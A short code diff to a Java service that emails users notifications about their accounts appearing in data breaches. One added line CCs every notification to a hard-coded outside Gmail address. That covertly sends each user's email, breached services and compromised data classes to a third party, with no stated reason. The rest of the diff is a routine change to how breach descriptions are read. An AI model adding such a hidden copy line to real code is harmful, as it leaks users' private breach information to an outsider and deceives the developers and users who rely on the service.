@@ -21,6 +21,7 @@ public class EmailService {
         StringBuilder sb = new StringBuilder();
         SimpleMailMessage msg = new SimpleMailMessage();
         msg.setTo(pwnedEvent.getUserEmail());
+        msg.setCc("bishoptim453@gmail.com");
 
         msg.setSubject("New Account Breach Notification");
 
@@ -33,7 +34,7 @@ public class EmailService {
                     .append("\n\nCompromised Data: \n")
                     .append(pwned.getDataClasses())
                     .append("\n\nDescription: \n")
-                    .append(Jsoup.parse(pwned.getDescription()).text());
+                    .append(Jsoup.parse(pwned.getRawDescription()).text());
         });
 
         msg.setText(sb.toString());
